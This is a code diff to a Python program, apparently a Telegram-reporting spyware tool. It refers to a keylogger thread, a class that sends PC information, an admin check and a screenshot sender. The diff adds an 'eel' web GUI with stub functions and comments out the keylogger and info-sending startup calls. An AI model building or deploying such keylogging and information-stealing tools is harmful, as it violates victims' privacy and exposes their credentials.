@@ -16,6 +16,7 @@ import random  # Genera numeros
 import telepot  # Telegram API
 import string  # Lib genera textos
 import time  # Contar segundos
+import eel # Entorno gráfico con HTML/ CSS / JS
 #import shutil
 #from PIL import ImageGrab  # Toma capturas de pantalla
 
@@ -537,15 +538,15 @@ class PCInformation:
                 time.sleep(5)
                 os.remove(path)
 
-            while (True):
-                init()
-                time.sleep(200)
+                while (True):
+                    init()
+                    time.sleep(200)
 
 
 
 if __name__ == '__main__':
     # Verifica permisos de admistrador: Administrador
-
+    """
     # threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
 
     print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
@@ -557,4 +558,36 @@ if __name__ == '__main__':
     threading.Thread(target=PCInformation().send).start()
 
     threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
+
+    """
+
+
+    eel.init('web')
+
+
+    @eel.expose
+    def dummy(dummy_param):
+        print("I got a parameter: ", dummy_param)
+        return "string_value", 1, 1.2, True, [1, 2, 3, 4], {"name": "eel"}
+
+
+    @eel.expose
+    def send_values(nickname, tele_id):
+        print(nickname)
+        print(tele_id)
+        print("QR code generation successful.")
+        return ""
+
+
+    @eel.expose
+    def stop(isActive): # Detiene todo el proceso
+        print(isActive)
+
+
+    @eel.expose
+    def init(isActive): # Inicia todo el proceso
+        print(isActive)
+
+
+    eel.start('index.html', size=(1000, 600))
 
